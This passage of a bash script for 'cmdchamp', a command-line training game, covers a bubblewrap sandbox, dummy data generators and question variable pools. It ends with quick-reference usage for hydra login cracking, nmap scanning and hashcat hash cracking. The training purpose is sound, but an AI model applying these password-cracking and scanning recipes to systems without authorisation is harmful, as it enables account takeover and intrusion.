#!/usr/bin/env bash
# cmdchamp
set -uo pipefail
[[ ${BASH_VERSINFO[0]:-0} -lt 4 || (${BASH_VERSINFO[0]} -eq 4 && ${BASH_VERSINFO[1]:-0} -lt 3) ]] && { echo "Requires bash 4.3+"; exit 1; }
_tty() { [[ -t 0 ]] || { echo "Error: requires interactive terminal" >&2; exit 1; }; }

DATA="${XDG_DATA_HOME:-$HOME/.local/share}/cmdchamp"; mkdir -p "$DATA"; touch "$DATA/scores"

# ═══════════════════════════════════════════════════════════════════════════════
# PLAYER PROFILE & BOSS SYSTEM
# ═══════════════════════════════════════════════════════════════════════════════
PLAYER_NAME="" PLAYER_XP=0 BOSS_BEATEN=-1

_load_profile() {
  [[ -f "$DATA/profile" ]] && source "$DATA/profile"
  [[ -z "$PLAYER_NAME" ]] && _first_run
}

_save_profile() {
  printf 'PLAYER_NAME=%q\nPLAYER_XP=%d\nBOSS_BEATEN=%d\n' "$PLAYER_NAME" "$PLAYER_XP" "$BOSS_BEATEN" > "$DATA/profile"
}

_first_run() {
  printf '\e[2J\e[H'
  cat <<'EOF'

    ██████╗███╗   ███╗██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ███╗██████╗
   ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗████╗ ████║██╔══██╗
   ██║     ██╔████╔██║██║  ██║██║     ███████║███████║██╔████╔██║██████╔╝
   ██║     ██║╚██╔╝██║██║  ██║██║     ██╔══██║██╔══██║██║╚██╔╝██║██╔═══╝
   ╚██████╗██║ ╚═╝ ██║██████╔╝╚██████╗██║  ██║██║  ██║██║ ╚═╝ ██║██║
    ╚═════╝╚═╝     ╚═╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝

                      ░▒▓█ MASTER THE COMMAND LINE █▓▒░

EOF
  echo
  read -rp "    Enter your handle: " PLAYER_NAME
  [[ -z "$PLAYER_NAME" ]] && PLAYER_NAME="anon"
  PLAYER_XP=0
  BOSS_BEATEN=-1
  _save_profile
  _intro
}

_intro() {
  printf '\e[2J\e[H'
  # Padding: inner width 66, fixed text 44 chars ("      You are " + ". You have only your terminal.")
  local pad=$((22 - ${#PLAYER_NAME}))
  local spaces; printf -v spaces '%*s' "$pad" ''
  cat <<EOF


    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░                                                                  ░░
    ░░      The networks are dead. The cloud is ash.                    ░░
    ░░      What remains runs on bone and silicon.                      ░░
    ░░                                                                  ░░
    ░░      You are ${C}${PLAYER_NAME}${N}. You have only your terminal.${spaces}░░
    ░░                                                                  ░░
    ░░      29 gatekeepers guard the path to ROOT.                      ░░
    ░░      Learn their commands. Speak their language.                 ░░
    ░░                                                                  ░░
    ░░                         ${D}Or be forgotten.${N}                         ░░
    ░░                                                                  ░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░


EOF
  read -rsn1 -p "                        Press Enter to begin..."
  echo
}

# Boss names - command/system themed
declare -a BOSS_NAMES=(
  "n00b" "CopyPasta" "CatMan" "PipeWrench" "Redirect"
  "DevNull" "AndOr" "BackgroundNoise" "\$VARIABLE" "\$\$"
  "TestCase" "SubShell" "Globber" "QuoteMaster" "ArrayLord"
  "TheFork" "Regex" "Cron" "Daemon" "RootKit"
  "KernelPanic" "Segfault" "ZeroDay" "TheFirewall" "Entropy"
  "Singularity" "Void" "Omega" "ROOT"
)

# Boss flavor text - dark + command themed
declare -a BOSS_FLAVOR=(
  "We all die as n00bs first."
  "Your keystrokes echo in empty halls."
  "I read the bones of dead files."
  "Data flows through me like blood."
  "I send your output to the grave."
  "Your stderr falls into the void."
  "True or false. Live or die."
  "I wait in the dark between processes."
  "I hold what you've forgotten."
  "Every process has a death."
  "Pass my test or be terminated."
  "Trapped in shells within shells."
  "I match everything. I consume all."
  "Escape is just another cage."
  "Count from zero. End at null."
  "I birth processes that outlive you."
  "I see patterns in your ashes."
  "I wake the dead at midnight."
  "I run while you sleep forever."
  "I take what isn't given."
  "The kernel screams. No one hears."
  "Your memory is already corrupted."
  "No patch saves you from me."
  "Nothing enters. Nothing leaves."
  "Chaos is the only certainty."
  "All threads end here."
  "I am where data goes to die."
  "Everything ends. I am the proof."
  "I am ROOT. Bow or break."
)

# Level names
declare -a LEVEL_NAMES=(
  "First Steps" "Save Your Work" "Reading Files" "Basic Pipes" "Input & Transform"
  "Error Handling" "Logic Gates" "Variables" "Special Variables" "Job Control"
  "Test Conditions" "Core File Tools" "System Admin" "Multiplexers" "Text Search"
  "File Finding" "Data Processing" "String & Arrays" "Control Flow" "Batch Ops"
  "Advanced Regex" "Git" "Network Tools" "Network Scanning" "WiFi & RF"
  "Hash Cracking" "Forensics" "Privilege Escalation" "ROOT"
)

# Boss splash screen
_boss_splash() {
  local lv=$1
  local boss="${BOSS_NAMES[$lv]}"
  local flavor="${BOSS_FLAVOR[$lv]}"
  clear
  echo
  echo
  echo -e "                         \e[31m\e[1m═══ BOSS ═══\e[0m"
  echo
  echo -e "                           \e[33m\e[1m$boss\e[0m"
  echo
  echo -e "                       \e[2m\"$flavor\"\e[0m"
  echo
  echo -e "                    \e[2mNo hints. 4/5 to pass.\e[0m"
  echo
  read -rsn1 -p "                     Press Enter to continue..."
  echo
}

# ═══════════════════════════════════════════════════════════════════════════════
# SANDBOX SYSTEM - Real command execution in isolated environment
# ═══════════════════════════════════════════════════════════════════════════════
SANDBOX_MODE=1  # ON by default
SANDBOX_PRISTINE="$DATA/sandbox.pristine"
SANDBOX_DIR="$DATA/sandbox"

# Check bwrap dependency
_check_bwrap() {
  command -v bwrap &>/dev/null || {
    echo -e "${R}Error: bubblewrap (bwrap) not installed${N}" >&2
    echo "Install: paru -S bubblewrap" >&2
    SANDBOX_MODE=0
    return 1
  }
}

# Generate log file with realistic nginx-style entries
_gen_log() {
  local f="$1" lines="${2:-50}"
  local ips=("192.168.1.100" "10.0.0.5" "172.16.0.50" "192.168.8.1" "10.10.10.10")
  local codes=("200" "200" "200" "200" "301" "304" "400" "403" "404" "500")
  local methods=("GET" "GET" "GET" "POST" "PUT" "DELETE")
  local paths=("/" "/index.html" "/api/users" "/api/data" "/login" "/static/style.css" "/favicon.ico" "/admin" "/search" "/api/v1/status")
  local agents=("Mozilla/5.0" "curl/7.68" "wget" "Python-requests" "Go-http-client")
  > "$f"
  for ((i=0; i<lines; i++)); do
    local ip="${ips[$((RANDOM % ${#ips[@]}))]}"
    local code="${codes[$((RANDOM % ${#codes[@]}))]}"
    local method="${methods[$((RANDOM % ${#methods[@]}))]}"
    local path="${paths[$((RANDOM % ${#paths[@]}))]}"
    local agent="${agents[$((RANDOM % ${#agents[@]}))]}"
    local size=$((RANDOM % 50000 + 100))
    local ts=$(date -d "-$((RANDOM % 86400)) seconds" "+%d/%b/%Y:%H:%M:%S +0000" 2>/dev/null || date "+%d/%b/%Y:%H:%M:%S +0000")
    printf '%s - - [%s] "%s %s HTTP/1.1" %s %d "%s"\n' "$ip" "$ts" "$method" "$path" "$code" "$size" "$agent" >> "$f"
  done
}

# Generate app log with ERROR/WARN/INFO levels
_gen_app_log() {
  local f="$1" lines="${2:-40}"
  local levels=("INFO" "INFO" "INFO" "INFO" "WARN" "WARN" "ERROR" "DEBUG")
  local msgs_info=("Request processed" "User logged in" "Cache hit" "Connection established" "Task completed" "Session started")
  local msgs_warn=("Slow query detected" "Memory usage high" "Rate limit approaching" "Deprecated API used" "Retry attempt")
  local msgs_error=("Connection refused" "Timeout exceeded" "Invalid request" "Permission denied" "Database error" "Null pointer")
  > "$f"
  for ((i=0; i<lines; i++)); do
    local level="${levels[$((RANDOM % ${#levels[@]}))]}"
    local ts=$(date -d "-$((RANDOM % 86400)) seconds" "+%Y-%m-%d %H:%M:%S" 2>/dev/null || date "+%Y-%m-%d %H:%M:%S")
    local msg
    case "$level" in
      INFO|DEBUG) msg="${msgs_info[$((RANDOM % ${#msgs_info[@]}))]}";;
      WARN) msg="${msgs_warn[$((RANDOM % ${#msgs_warn[@]}))]}";;
      ERROR) msg="${msgs_error[$((RANDOM % ${#msgs_error[@]}))]}";;
    esac
    printf '[%s] %s: %s\n' "$ts" "$level" "$msg" >> "$f"
  done
}

# Generate CSV with headers and typed data
_gen_csv() {
  local f="$1" rows="${2:-30}"
  local names=("Alice" "Bob" "Charlie" "Diana" "Eve" "Frank" "Grace" "Henry" "Ivy" "Jack")
  local domains=("example.com" "test.org" "demo.net" "sample.io")
  local statuses=("active" "active" "active" "inactive" "pending")
  echo "id,name,email,status,timestamp" > "$f"
  for ((i=1; i<=rows; i++)); do
    local name="${names[$((RANDOM % ${#names[@]}))]}"
    local domain="${domains[$((RANDOM % ${#domains[@]}))]}"
    local status="${statuses[$((RANDOM % ${#statuses[@]}))]}"
    local ts=$(date -d "-$((RANDOM % 2592000)) seconds" "+%Y-%m-%d" 2>/dev/null || date "+%Y-%m-%d")
    printf '%d,%s,%s@%s,%s,%s\n' "$i" "$name" "${name,,}" "$domain" "$status" "$ts" >> "$f"
  done
}

# Generate INI config
_gen_ini() {
  local f="$1"
  cat > "$f" <<'EOF'
[server]
host = 0.0.0.0
port = 8080
workers = 4
timeout = 30

[database]
type = postgresql
host = localhost
port = 5432
name = appdb
user = admin

[logging]
level = info
file = /var/log/app.log
rotate = daily

[cache]
enabled = true
ttl = 3600
backend = redis
EOF
}

# Generate YAML config
_gen_yaml() {
  local f="$1"
  cat > "$f" <<'EOF'
server:
  host: 0.0.0.0
  port: 8080
  workers: 4
  ssl:
    enabled: false
    cert: /etc/ssl/cert.pem

database:
  primary:
    host: localhost
    port: 5432
    name: appdb
  replica:
    host: replica.local
    port: 5432

logging:
  level: info
  outputs:
    - stdout
    - file:/var/log/app.log

features:
  cache: true
  metrics: true
  debug: false
EOF
}

# Generate plain text notes
_gen_txt() {
  local f="$1"
  cat > "$f" <<'EOF'
Meeting Notes - Project Review
==============================

Attendees: Alice, Bob, Charlie

Action Items:
1. Update documentation
2. Fix authentication bug
3. Deploy to staging
4. Review security patches

Discussion Points:
- Performance improvements needed
- New feature requests from users
- Timeline for next release

TODO: Schedule follow-up meeting
TODO: Review pull requests
TODO: Update dependencies

Notes:
The deployment went smoothly.
Minor issues with caching fixed.
Need to monitor error rates.

Completed tasks:
- Database migration
- API versioning
- Load testing
EOF
}

# Generate user data CSV
_gen_users_csv() {
  local f="$1" rows="${2:-20}"
  local fnames=("john" "jane" "mike" "sarah" "tom" "lisa" "david" "emma" "alex" "olivia")
  local lnames=("smith" "jones" "wilson" "brown" "taylor" "davis" "miller" "garcia" "martinez" "lee")
  local roles=("admin" "user" "user" "user" "moderator" "guest")
  echo "username,fullname,role,created,logins" > "$f"
  for ((i=1; i<=rows; i++)); do
    local fn="${fnames[$((RANDOM % ${#fnames[@]}))]}"
    local ln="${lnames[$((RANDOM % ${#lnames[@]}))]}"
    local role="${roles[$((RANDOM % ${#roles[@]}))]}"
    local logins=$((RANDOM % 500))
    local ts=$(date -d "-$((RANDOM % 31536000)) seconds" "+%Y-%m-%d" 2>/dev/null || date "+%Y-%m-%d")
    printf '%s_%s,%s %s,%s,%s,%d\n' "$fn" "$ln" "${fn^}" "${ln^}" "$role" "$ts" "$logins" >> "$f"
  done
}

# Generate JSON data
_gen_json() {
  local f="$1"
  cat > "$f" <<'EOF'
{
  "version": "1.0.0",
  "data": [
    {"id": 1, "name": "Item One", "status": "active", "count": 42},
    {"id": 2, "name": "Item Two", "status": "pending", "count": 17},
    {"id": 3, "name": "Item Three", "status": "active", "count": 89},
    {"id": 4, "name": "Item Four", "status": "inactive", "count": 5}
  ],
  "metadata": {
    "total": 4,
    "generated": "2024-01-15"
  }
}
EOF
}

# Generate all sandbox files
_gen_sandbox_files() {
  local dir="$1"
  mkdir -p "$dir"/{src/test,logs,data}

  _gen_log "$dir/server.log" 50
  _gen_app_log "$dir/app.log" 40
  _gen_csv "$dir/data.csv" 30
  _gen_users_csv "$dir/users.csv" 20
  _gen_ini "$dir/config.ini"
  _gen_yaml "$dir/settings.yaml"
  _gen_txt "$dir/notes.txt"
  _gen_json "$dir/data/export.json"

  # Access/error logs
  _gen_log "$dir/logs/access.log" 30
  _gen_app_log "$dir/logs/error.log" 20

  # Safe script (echo only)
  cat > "$dir/backup.sh" <<'EOF'
#!/bin/bash
echo "Backup started at $(date)"
echo "Backing up files..."
echo "Backup complete!"
EOF
  chmod +x "$dir/backup.sh"

  # Python source files
  cat > "$dir/main.py" <<'EOF'
#!/usr/bin/env python3
"""Main application module."""

def main():
    print("Hello, World!")
    return 0

if __name__ == "__main__":
    main()
EOF

  cat > "$dir/src/utils.py" <<'EOF'
"""Utility functions."""

def helper(x):
    return x * 2

def process(data):
    return [helper(item) for item in data]
EOF

  cat > "$dir/src/test/test_utils.py" <<'EOF'
"""Tests for utils module."""
import unittest

class TestUtils(unittest.TestCase):
    def test_helper(self):
        self.assertEqual(helper(2), 4)

if __name__ == "__main__":
    unittest.main()
EOF
}

# Initialize sandbox (create pristine copy if needed)
_sandbox_init() {
  ((SANDBOX_MODE)) || return 0
  _check_bwrap || return 1
  if [[ ! -d "$SANDBOX_PRISTINE" ]]; then
    _gen_sandbox_files "$SANDBOX_PRISTINE"
  fi
  _sandbox_reset
}

# Reset sandbox to pristine state
_sandbox_reset() {
  ((SANDBOX_MODE)) || return 0
  [[ -d "$SANDBOX_PRISTINE" ]] || return 1
  rm -rf "$SANDBOX_DIR"
  cp -a "$SANDBOX_PRISTINE" "$SANDBOX_DIR"
}

# Execute command in sandbox with bwrap isolation
_sandbox_exec() {
  local cmd="$1" timeout_sec="${2:-5}"
  ((SANDBOX_MODE)) || return 1

  # Build bwrap args - bind /lib* only if they exist
  local -a bwrap_args=(
    --ro-bind /usr /usr
    --ro-bind /bin /bin
    --ro-bind /etc/passwd /etc/passwd
    --ro-bind /etc/group /etc/group
    --bind "$SANDBOX_DIR" /sandbox
    --chdir /sandbox
    --setenv HOME /sandbox
    --setenv USER sandbox
    --unshare-all
    --die-with-parent
    --new-session
  )
  [[ -e /lib ]] && bwrap_args+=(--ro-bind /lib /lib)
  [[ -e /lib64 ]] && bwrap_args+=(--ro-bind /lib64 /lib64)

  timeout "$timeout_sec" bwrap "${bwrap_args[@]}" /bin/bash -c "$cmd" 2>&1
}

# Track if command was destructive (for per-question reset)
_SANDBOX_DESTRUCTIVE=0
_is_destructive() {
  local cmd="$1"
  [[ "$cmd" =~ (^|[[:space:]])(rm|mv|cp|>|>>|chmod|chown)[[:space:]] ]] && return 0
  return 1
}

# Validate command output
# Returns 0 if output matches expected
# Expected formats:
#   exact text - exact match
#   ~regex     - regex match
#   @N         - line count match
#   *          - any output (just check command ran)
_sandbox_check_output() {
  local actual="$1" expected="$2"
  [[ -z "$expected" ]] && return 1

  case "$expected" in
    \~*)  # Regex match
      local pattern="${expected:1}"
      [[ "$actual" =~ $pattern ]] && return 0
      ;;
    @*)   # Line count match
      local count="${expected:1}"
      local lines=$(echo -n "$actual" | wc -l)
      ((lines == count)) && return 0
      ;;
    \*)   # Any output
      [[ -n "$actual" ]] && return 0
      ;;
    *)    # Exact match (trimmed)
      actual="${actual#"${actual%%[![:space:]]*}"}"
      actual="${actual%"${actual##*[![:space:]]}"}"
      expected="${expected#"${expected%%[![:space:]]*}"}"
      expected="${expected%"${expected##*[![:space:]]}"}"
      [[ "$actual" == "$expected" ]] && return 0
      ;;
  esac
  return 1
}

# Validate file state after command
# Formats: exists:file, !exists:file, contains:file:pattern, lines:file:N
_sandbox_check_state() {
  local checks="$1"
  IFS=',' read -ra checks_arr <<< "$checks"
  for check in "${checks_arr[@]}"; do
    case "$check" in
      exists:*)
        local file="${check#exists:}"
        [[ -e "$SANDBOX_DIR/$file" ]] || return 1
        ;;
      !exists:*)
        local file="${check#!exists:}"
        [[ ! -e "$SANDBOX_DIR/$file" ]] || return 1
        ;;
      contains:*:*)
        local rest="${check#contains:}"
        local file="${rest%%:*}"
        local pattern="${rest#*:}"
        grep -q "$pattern" "$SANDBOX_DIR/$file" 2>/dev/null || return 1
        ;;
      lines:*:*)
        local rest="${check#lines:}"
        local file="${rest%%:*}"
        local count="${rest#*:}"
        local actual=$(wc -l < "$SANDBOX_DIR/$file" 2>/dev/null)
        ((actual == count)) || return 1
        ;;
    esac
  done
  return 0
}
# Terminal state management
_stty_saved=""
_cleanup() { [[ -n "$_stty_saved" ]] && stty "$_stty_saved" 2>/dev/null; echo; }
trap '_cleanup; exit 0' INT TERM HUP EXIT
R=$'\e[31m' G=$'\e[32m' Y=$'\e[33m' Bl=$'\e[34m' M=$'\e[35m' C=$'\e[36m' W=$'\e[97m' D=$'\e[2m' B=$'\e[1m' N=$'\e[0m'
PROMPT_CHAR="${CMD_PROMPT:-$([[ $EUID -eq 0 ]] && echo '# ' || echo '$ ')}"

# ═══════════════════════════════════════════════════════════════════════════════
# VARIABLE POOLS
# ═══════════════════════════════════════════════════════════════════════════════

# SANDBOX FILES - files that actually exist in sandbox
declare -a SANDBOX_LOGS=(server.log app.log logs/access.log logs/error.log)
declare -a SANDBOX_TXTS=(notes.txt)
declare -a SANDBOX_CSVS=(data.csv users.csv)
declare -a SANDBOX_CFGS=(config.ini settings.yaml)
declare -a SANDBOX_SCRIPTS=(backup.sh)
declare -a SANDBOX_PY=(main.py src/utils.py src/test/test_utils.py)

# LOGS - 25 options (was 10)
declare -a LOGS=(server.log app.log system.log auth.log access.log error.log debug.log nginx.log apache.log syslog
  messages kern.log daemon.log mail.log secure dpkg.log pacman.log audit.log boot.log faillog lastlog
  wtmp btmp cron.log yum.log dmesg)

# CONFIGS - 20 options (was 8)
declare -a CONFIGS=(config.ini settings.conf app.yaml server.conf nginx.conf httpd.conf my.cnf pg.conf
  redis.conf sshd_config sudoers fstab hosts resolv.conf profile bashrc vimrc tmux.conf gitconfig
  docker-compose.yml)

# SCRIPTS - 20 options (was 8)
declare -a SCRIPTS=(backup.sh deploy.sh build.sh test.sh cleanup.sh migrate.sh sync.sh init.sh
  setup.sh install.sh update.sh monitor.sh healthcheck.sh rotate.sh fetch.sh push.sh start.sh stop.sh
  restart.sh validate.sh)

# TXTS - 15 options (was 7)
declare -a TXTS=(data.txt notes.txt output.txt report.txt dump.txt results.txt temp.txt
  readme.txt todo.txt changelog.txt manifest.txt inventory.txt urls.txt hosts.txt targets.txt)

# CSVS - 12 options (was 6)
declare -a CSVS=(data.csv users.csv logs.csv export.csv report.csv stats.csv
  metrics.csv transactions.csv inventory.csv orders.csv customers.csv events.csv)

# BINS - 12 options (was 6)
declare -a BINS=(binary.exe program.elf app.bin firmware.bin malware.exe sample.bin
  payload.dll trojan.exe rootkit.so agent.bin dropper.exe beacon.bin)

# IMGS - 10 options (was 4)
declare -a IMGS=(disk.img backup.img system.img evidence.img
  memory.dmp vmcore.dmp hiberfil.sys pagefile.sys snapshot.raw forensic.dd)

# PCAPS - 10 options (was 4)
declare -a PCAPS=(capture.pcap traffic.pcap network.pcap dump.pcap
  scan.pcap attack.pcap session.pcap handshake.pcap dns.pcap http.pcap)

# HASHES - 12 options (was 6)
declare -a HASHES=(hash.txt hashes.txt md5.txt sha256.txt passwd.txt shadow.txt
  ntlm.txt cracked.txt potfile.txt wordlist.hash lm.txt bcrypt.txt)

# WORDLISTS - 12 options (was 4)
declare -a WORDLISTS=(wordlist.txt rockyou.txt passwords.txt dict.txt
  common.txt custom.txt leaked.txt company.txt names.txt cities.txt hybrid.txt rules.txt)

# ARCHIVES - 12 options (was 5)
declare -a ARCHIVES=(backup.tar.gz archive.tar.gz files.tgz data.tar.bz2 export.zip
  snapshot.tar.xz bundle.tar release.tar.gz package.tar.gz source.tar.bz2 logs.tar.gz dump.tar.zst)

# PHOTOS - 12 options (was 5)
declare -a PHOTOS=(photo.jpg image.png screenshot.png evidence.jpg document.pdf
  scan.tiff capture.bmp diagram.svg icon.ico avatar.webp thumbnail.gif render.raw)

# DIRS - 20 options (was 10)
declare -a DIRS=(src lib bin tmp logs data config backup output cache
  build dist vendor node_modules target public static assets uploads downloads)

# EXTS - 25 options (was 15)
declare -a EXTS=(py js ts go rs c cpp java rb sh log txt conf yaml json
  toml md html css sql xml csv ini env php pl lua zig swift)

# SEARCH_TERMS - 25 options (was 11)
declare -a SEARCH_TERMS=(error warning panic fatal timeout exception failed invalid denied refused connection
  unauthorized forbidden crash segfault nullptr overflow leak abort reject throttle blocked suspend
  corrupt missing expired revoked)

# USERNAMES - 20 options (was 10)
declare -a USERNAMES=(admin root user guest test deploy www-data nginx postgres mysql
  git jenkins ansible prometheus grafana redis mongodb elastic backup operator service)

# IPS - Dynamic generation + pool of 15 (was 7)
declare -a IPS=(10.0.0.1 10.0.0.5 10.10.10.10 192.168.1.1 192.168.1.100 172.16.0.1 10.0.0.50
  192.168.0.1 172.16.1.1 10.10.10.50 192.168.100.1 10.20.30.40 172.31.0.1 192.168.50.50 10.0.1.1)

# SUBNETS - 10 options (was 4)
declare -a SUBNETS=(10.0.0.0/24 192.168.1.0/24 172.16.0.0/16 10.10.10.0/24
  192.168.0.0/24 172.17.0.0/16 10.20.0.0/16 192.168.100.0/24 10.0.0.0/8 172.31.0.0/16)

# PORTS - 25 options (was 11)
declare -a PORTS=(22 80 443 8080 3000 5000 8000 3306 5432 6379 27017
  21 23 25 53 110 143 389 445 993 995 1433 1521 5900 8443)

# MACS - 10 options (was 3)
declare -a MACS=(AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 DE:AD:BE:EF:CA:FE
  00:11:22:33:44:55 A1:B2:C3:D4:E5:F6 12:34:56:78:9A:BC FE:DC:BA:98:76:54
  CA:FE:BA:BE:00:01 01:23:45:67:89:AB AB:CD:EF:12:34:56)

# URLS - 12 options (was 4)
declare -a URLS=(http://10.0.0.1 http://192.168.1.100 http://target.local http://10.10.10.10
  http://192.168.0.1 http://172.16.1.1 http://dev.local http://staging.local
  http://app.local http://api.local http://admin.local http://internal.local)

# FIELDS - 15 options (was 10)
declare -a FIELDS=(name id status email timestamp user_id created_at value count type
  updated_at deleted_at version priority level source target duration size)

# JSON_KEYS - 12 options (was 6)
declare -a JSON_KEYS=(data items results users records entries
  events messages logs errors nodes objects resources payload)

# REPLACE_OLD/NEW - 15 pairs each (was 8)
declare -a REPLACE_OLD=(foo old debug localhost http TODO FIXME tmp
  dev staging test alpha beta v1 deprecated warn error secret)
declare -a REPLACE_NEW=(bar new prod 10.0.0.1 https DONE RESOLVED cache
  prod production live release stable v2 current info success masked)

# SIZES - 10 options (was 5)
declare -a SIZES=(10M 50M 100M 500M 1G 5G 10G 100K 500K 2G)

# TIMES - 10 options (was 4)
declare -a TIMES=(5 15 30 60 120 180 360 720 1440 10080)  # minutes (up to 1 week)

# NUMBERS - dynamic, use _rnum for truly random
declare -a NUMBERS=(5 10 15 20 25 30 40 50 75 100 150 200 500)

# COLUMNS - 8 options (was 5)
declare -a COLUMNS=(1 2 3 4 5 6 7 8)

# DELIMS - 8 options (was 5)
declare -a DELIMS=(',' ':' '\t' '|' ';' '/' '-' '_')

# HASHCAT_MODES - 15 options with names (was 5)
declare -a HASHCAT_MODES=(0 100 1400 1800 3200 1000 5600 13100 18200 22000 500 1700 2500 5500 11300)
declare -a HASH_NAMES=(MD5 SHA1 SHA256 SHA512 bcrypt NTLM NetNTLMv2 Kerberos5 Kerberos5-etype23 WPA-PBKDF2 md5crypt SHA512crypt WPA Kerberos5-RC4 Bitcoin)

# INTERFACES - 10 options (was 4)
declare -a INTERFACES=(eth0 wlan0 ens33 enp0s3 ens192 enp0s25 wlp2s0 docker0 br0 virbr0)

# REMOTE_HOSTS - 15 options (was 6)
declare -a REMOTE_HOSTS=(server backup-host db-server web-server jump-host bastion
  prod-01 staging-01 dev-01 ci-runner build-server cache-01 redis-01 postgres-01 monitor)

# NEW: Process names for ps/kill questions
declare -a PROCS=(nginx apache2 mysqld postgres redis-server mongod node python3 java ruby
  docker containerd systemd sshd cron cups NetworkManager pulseaudio pipewire)

# NEW: Services for systemctl
declare -a SERVICES=(nginx apache2 mysql postgresql redis docker containerd sshd
  NetworkManager bluetooth cups cronie fail2ban ufw firewalld syncthing)

# NEW: Signals for kill
declare -a SIGNALS=(SIGTERM SIGKILL SIGHUP SIGINT SIGUSR1 SIGUSR2 SIGSTOP SIGCONT)

# NEW: Git branches
declare -a BRANCHES=(main master develop feature/auth feature/api fix/login hotfix/security release/v2)

# ═══════════════════════════════════════════════════════════════════════════════
# DYNAMIC GENERATION HELPERS - True infinite variation
# ═══════════════════════════════════════════════════════════════════════════════

# Unbiased random selection using rejection sampling
_pick() {
  local -n arr=$1
  local len=${#arr[@]}
  ((len == 0)) && { echo ""; return; }
  local max=$((32768 - 32768 % len)) r
  while r=$RANDOM; ((r >= max)); do :; done
  echo "${arr[$((r % len))]}"
}

# Unbiased random number in range: _rnum 1 100 -> random 1-100
_rnum() {
  local lo=$1 hi=$2
  ((lo > hi)) && { local t=$lo; lo=$hi; hi=$t; }  # swap if inverted
  local range=$((hi - lo + 1))
  local max=$((32768 - 32768 % range)) r
  while r=$RANDOM; ((r >= max)); do :; done
  echo $((lo + r % range))
}

# Random IP octet variations
_rip() { echo "$(($RANDOM % 255)).$(($RANDOM % 255)).$(($RANDOM % 255)).$(($RANDOM % 255 + 1))"; }

# Random port (common range)
_rport() { echo $(( 1024 + RANDOM % 64000 )); }

# Random line count
_rlines() { echo $(( 5 + RANDOM % 96 )); }  # 5-100

# Shuffle flags: "-la" can become "-al" or "-l -a"
_shuf_flags() {
  local flags="$1"
  [[ ${#flags} -le 2 ]] && { echo "$flags"; return; }
  # Remove leading dash, shuffle chars, add back
  local chars="${flags#-}"
  local shuffled=$(echo "$chars" | fold -w1 | shuf | tr -d '\n')
  echo "-$shuffled"
}

# Generate both flag orders for answers: "-la" -> "-la|-al"
_flag_alts() {
  local flags="$1"
  [[ ${#flags} -le 2 ]] && { echo "$flags"; return; }
  local chars="${flags#-}"
  local rev=$(echo "$chars" | rev)
  [[ "$chars" == "$rev" ]] && { echo "$flags"; return; }
  echo "$flags|-$rev"
}

# Unbiased pick from phrasings
_phrase() {
  local -a opts=("$@")
  local len=${#opts[@]}
  ((len == 0)) && { echo ""; return; }
  local max=$((32768 - 32768 % len)) r
  while r=$RANDOM; ((r >= max)); do :; done
  echo "${opts[$((r % len))]}"
}

# Context helper: sets all common vars in caller's scope (use with: local log cfg txt ... ; _ctx)
_ctx() {
  log=$(_pick LOGS); log2=$(_pick LOGS); cfg=$(_pick CONFIGS); cfg2=$(_pick CONFIGS)
  txt=$(_pick TXTS); txt2=$(_pick TXTS); csv=$(_pick CSVS); csv2=$(_pick CSVS)
  dir=$(_pick DIRS); dir2=$(_pick DIRS); ext=$(_pick EXTS); ext2=$(_pick EXTS)
  script=$(_pick SCRIPTS); archive=$(_pick ARCHIVES); bin=$(_pick BINS)
  img=$(_pick IMGS); pcap=$(_pick PCAPS); hash=$(_pick HASHES); photo=$(_pick PHOTOS)
  wordlist=$(_pick WORDLISTS); ip=$(_pick IPS); subnet=$(_pick SUBNETS)
  port=$(_pick PORTS); port2=$(_pick PORTS); mac=$(_pick MACS)
  url=$(_pick URLS); user=$(_pick USERNAMES); host=$(_pick REMOTE_HOSTS)
  term=$(_pick SEARCH_TERMS); term2=$(_pick SEARCH_TERMS); term3=$(_pick SEARCH_TERMS)
  field=$(_pick FIELDS); field2=$(_pick FIELDS); key=$(_pick JSON_KEYS)
  old=$(_pick REPLACE_OLD); new=$(_pick REPLACE_NEW); size=$(_pick SIZES)
  iface=$(_pick INTERFACES); proc=$(_pick PROCS); svc=$(_pick SERVICES)
  sig=$(_pick SIGNALS); branch=$(_pick BRANCHES); time=$(_pick TIMES)
  n1=$(_rnum 1 20); n2=$(_rnum 5 50); n3=$(_rnum 2 10); col=$(_rnum 1 5); n=$n1
}

# ═══════════════════════════════════════════════════════════════════════════════
# COMMAND EXPLANATIONS (shown on TAB)
# ═══════════════════════════════════════════════════════════════════════════════

# Mini manpages for complex commands (shown as block when command is first token)
declare -A MANPAGE=(
  [hydra]=$'\e[32;1mhydra\e[0m \e[2m- network login cracker\e[0m
  \e[36m-l\e[0m USER   single username        \e[36m-L\e[0m FILE   username list
  \e[36m-p\e[0m PASS   single password        \e[36m-P\e[0m FILE   password list
  \e[36m-t\e[0m N      threads per target     \e[36m-s\e[0m PORT   target port
  \e[33mPROTOCOLS:\e[0m ssh ftp http-get http-post-form mysql smb rdp
  \e[33mhttp-post-form\e[0m \e[2m'"'"'/path:user=\e[33m^USER^\e[0m\e[2m&pass=\e[33m^PASS^\e[0m\e[2m:F=fail'"'"'\e[0m'
  [nmap]=$'\e[32;1mnmap\e[0m \e[2m- network scanner\e[0m
  \e[36m-sS\e[0m       SYN scan (stealth)     \e[36m-sT\e[0m       TCP connect
  \e[36m-sU\e[0m       UDP scan               \e[36m-sV\e[0m       version detect
  \e[36m-sC\e[0m       default scripts        \e[36m-O\e[0m        OS detection
  \e[36m-p\e[0m 22,80  specific ports         \e[36m-p-\e[0m       all 65535 ports
  \e[36m-Pn\e[0m       skip ping              \e[36m-A\e[0m        aggressive'
  [hashcat]=$'\e[32;1mhashcat\e[0m \e[2m- GPU hash cracker\e[0m
  \e[36m-m\e[0m TYPE   hash type \e[2m(0=MD5 100=SHA1 1000=NTLM 1800=SHA512)\e[0m
  \e[36m-a\e[0m MODE   attack \e[2m(0=dict, 3=brute)\e[0m     \e[36m--show\e[0m   show cracked
  \e[33mMASKS:\e[0m ?l=lower ?u=upper ?d=digit ?s=special ?a=all'
